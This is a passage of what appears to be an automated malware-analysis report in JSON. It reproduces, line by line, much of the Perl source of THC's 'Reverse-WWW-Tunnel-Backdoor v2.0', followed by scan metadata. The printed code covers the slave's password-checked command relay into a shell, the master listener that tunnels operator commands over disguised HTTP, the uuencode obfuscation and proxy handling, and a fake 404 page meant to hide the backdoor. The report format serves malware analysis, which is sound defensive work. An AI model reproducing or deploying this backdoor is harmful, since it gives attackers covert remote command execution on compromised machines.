            "\t\t\tprint STDERR \"!\"\tif $DEBUG;",
            "\t\t\tgoto OK  if (($readin eq \"\\000\") or ($readin eq \"\\n\")",
            "\t\t\t\tor ($readin eq \"\"));",
            "\t\t\t$input = $input . $readin;",
            "#\t\t}",
            "OK:\t\tprint STDERR \"\\nall data read, entering OK\\n\"\tif $DEBUG;",
            "\t\tprint STDERR \"RECEIVE: $input\\n\"\tif $DEBUG;",
            "\t\t$input =~ s/.*\\r\\n\\r\\n//s;",
            "\t\tprint STDERR \"BEFORE DECODING: $input\\n\"\tif $DEBUG;",
            "\t\t&uudecode;\t\t# decoding the data from the master",
            "\t\tprint STDERR \"AFTER DECODING: $decoded\\n\"\tif $DEBUG;",
            "\t\tprint STDERR \"if password not found -> exit\\n\"\tif $DEBUG;",
            "\t\tgoto END_IT\tif ($decoded =~ m/^$PASSWORD/s == 0);",
            "\t\t$decoded =~ s/^$PASSWORD//;",
            "\t\tprint STDERR \"writing input data to $SHELL\\n\"\tif $DEBUG;",
            "\t\tprint W_IN \"$decoded\" || goto END_IT;\t# sending the data",
            "\t\tsleep(1);\t\t\t\t# to the shell proc.",
            "\t\tprint STDERR \"jumping to GO\\n\"\tif $DEBUG;",
            "\t\tgoto GO;",
            "END_IT:\tkill 9, $pid;\t$pid = 0;",
            "\texit(0);",
            "} # END OF SLAVE FUNCTION",
            "############### MASTER FUNCTION ###############",
            "sub master {",
            "\tsocket(THC, &PF_INET, &SOCK_STREAM, $protocol)",
            "\t\tor die \"can't create socket\\n\";",
            "\tsetsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);",
            "\tbind(THC, sockaddr_in($LISTEN_PORT, INADDR_ANY)) || die \"can't bind\\n\";",
            "\tlisten(THC, 3) || die \"can't listen\\n\";\t\t# print the HELP",
            "\tprint STDOUT '",
            "Welcome to the Reverse-WWW-Tunnel-Backdoor v2.0 by van Hauser / THC ...",
            "Introduction: \tWait for your SLAVE to connect, examine it\\'s output and then",
            "\t\ttype in your commands to execute on SLAVE. You\\'ll have to",
            "\t\twait min. the set $DELAY seconds before you get the output",
            "\t\tand can execute the next stuff. Use \";\" for multiple commands.",
            "\t\tTrying to execute interactive commands may give you headache",
            "\t\tso beware. Your SLAVE may hang until the daily connect try",
            "\t\t(if set - otherwise you lost).",
            "\t\tYou also shouldn\\'t try to view binary data too ;-)",
            "\t\t\"echo bla >> file\", \"cat >> file <<- EOF\", sed etc. are your",
            "\t\tfriends if you don\\'t like using vi in a delayed line mode ;-)",
            "\t\tTo exit this program on any time without doing harm to either",
            "\t\tMASTER or SLAVE just press Control-C.",
            "\t\tNow have fun.",
            "YOP:\tprint STDOUT \"\\nWaiting for connect ...\";",
            "\t$remote=accept (S, THC)  ||  goto YOP;\t\t# get the connection",
            "\t($r_port, $r_slave)=sockaddr_in($remote);\t# and print the SLAVE",
            "\t$slave=gethostbyaddr($r_slave, AF_INET);\t# data.",
            "\t$slave=\"unresolved\" if ($slave eq \"\");",
            "\tprint STDOUT \" connect from $slave/\".inet_ntoa($r_slave).\":$r_port\\n\";",
            "\tselect S;\t$|=1;",
            "\tselect STDOUT;\t$|=1;",
            "\t$input = \"\";",
            "\tvec($socks, fileno(S), 1) = 1;",
            "\t$error=\"no\";",
            "#\twhile (1) {\t\t\t# read the data sent by the slave",
            "\t\twhile (! select($r = $socks, undef, undef, 0.00001)) {}",
            "\t\trecv (S, $readin, 16386, 0) || undef $error;",
            "\t\tif ((! $error) and (! $BROKEN_RECV)) {",
            "\t\t    print STDOUT \"[disconnected]\\n\";",
            "#\t\t$readin =~ s/\\r//g;",
            "#\t\t$input = $input . $readin;",
            "#\t\tlast  if ( $input =~ m/\\r\\n\\r\\n/s );",
            "\t\t$input = $readin;",
            "\t\tprint STDERR \"MASTER RECEIVE: $input\\n\"\tif $DEBUG;",
            "\t&hide_as_broken_webserver  if ( $input =~ m/$CGI_PREFIX/s == 0 );",
            "\tif ( $input =~ m/^GET /s ) {",
            "\t\t$input =~ s/^.*($CGI_PREFIX)\\??//s;",
            "\t\t$input =~ s/\\r\\n.*$//s;",
            "\t} else { if ( $input =~ m/^POST /s ) {",
            "\t\t$input =~ s/^.*\\r\\n\\r\\n//s;",
            "\t} else { if ( $input =~ m/^HEAD /s ) {",
            "\t\t&hide_as_broken_webserver;",
            "\t} else {",
            "\t\tclose S;",
            "\t\tprint STDOUT \"Warning! Illegal server access!\\n\";   # report to user",
            "\t\tgoto YOP;",
            "\t} } }",
            "\tprint STDERR \"BEFORE DECODING: $input\\n\"\tif $DEBUG;",
            "\t&uudecode;\t\t# decoding the data from the slave",
            "\t&hide_as_broken_webserver  if ( $decoded =~ m/^$PASSWORD/s == 0 );",
            "\t$decoded =~ s/^$PASSWORD//s;",
            "\t$decoded = \"[Warning! No output from remote!]\\n>\" if ($decoded eq \"\");",
            "\tprint STDOUT \"$decoded\";\t# showing the slave output to the user",
            "\t$output = <STDIN>;\t\t# and get his input.",
            "\t&uuencode;\t\t# encode the data for the slave",
            "\t$encoded = \"HTTP/1.1 200 OK\\r\\nConnection: close\\r\\nContent-Type: text/plain\\r\\n\\r\\n\" . $encoded . \"\\r\\n\";",
            "\tsend (S, $encoded, 0) || die \"\\nconnection lost!\\n\";\t# and send it",
            "\tclose (S);",
            "\tprint STDOUT \"sent.\\n\";",
            "\tgoto YOP;\t\t# wait for the next connect from the slave",
            "} # END OF MASTER FUNCTION",
            "###################### MISC. FUNCTIONS #####################",
            "sub uuencode {\t# does the encoding stuff for error-free data transfer via WWW",
            "\t$output = $PASSWORD . $output;\t\t# PW is for error checking and",
            "        $uuencoded = pack \"u\", \"$output\";\t# preventing sysadmins from",
            "        $uuencoded =~ tr/'\\n)=(:;&><,#$*%]!\\@\"`\\\\\\-'\t# sending you weird",
            "                        /'zcadefghjklmnopqrstuv'\t# data. No real",
            "                        /;\t\t\t\t# security!",
            "        $uuencoded =~ tr/\"'\"/'b'/;",
            "\tif ( ($PROXY) && ($SLAVE_MODE) ) {# proxy drops request if > 4kb",
            "\t\t$codelength = (length $uuencoded) + (length $REAL_PREFIX) +12;",
            "\t\t$cut_length = 4099 - (length $REAL_PREFIX);",
            "\t\t$uuencoded = pack \"a$cut_length\", $uuencoded",
            "\t\t\tif ($codelength > 4111);",
            "        $encoded = $uuencoded;",
            "} # END OF UUENCODE FUNCTION",
            "sub uudecode {\t# does the decoding of the data stream",
            "\t$input =~     tr/'zcadefghjklmnopqrstuv'",
            "\t\t\t/'\\n)=(:;&><,#$*%]!\\@\"`\\\\\\-'",
            "\t\t\t/;",
            "\t$input =~     tr/'b'/\"'\"/;",
            "\t$decoded = unpack \"u\", \"$input\";",
            "} # END OF UUDECODE FUNCTION",
            "sub base64encoding {\t# does the base64 encoding for proxy passwords",
            "\t$encode_string = $PROXY_USER . \":\" . $PROXY_PASSWORD;",
            "\t$encoded_string = substr(pack('u', $encode_string), 1);",
            "\tchomp($encoded_string);",
            "\t$encoded_string =~ tr|` -_|AA-Za-z0-9+/|;",
            "\t$padding = (3 - length($encode_string) % 3) % 3;",
            "\t$encoded_string =~ s/.{$padding}$/'=' x $padding/e if $padding;",
            "\t$PROXY_COOKIE = \"Proxy-authorization: Basic \" . $encoded_string . \"\\n\";",
            "} # END OF BASE64ENCODING FUNCTION",
            "sub hide_as_broken_webserver {\t# invalid request -> look like broken server",
            "\tsend (S, \"<HTML><HEAD>\\r\\n<TITLE>404 File Not Found</TITLE>\\r\\n</HEAD>\".",
            "\t\t \"<BODY>\\r\\n<H1>File Not Found</H1>\\r\\n</BODY></HTML>\\r\\n\", 0);",
            "\tclose S;",
            "\tprint STDOUT \"Warning! Illegal server access!\\n\";   # report to user",
            "\tgoto YOP;",
            "} # END OF HIDE_AS_BROKEN_WEBSERVER FUNCTION",
            "# END OF PROGRAM # (c) 1998-2002 by <vh@reptile.rug.ac.be>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1"
        ],
        "url": [
            "http://",
            "http://www.thehackerschoice.com"
        ]
    },
    "time": "0:00:00.351337",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
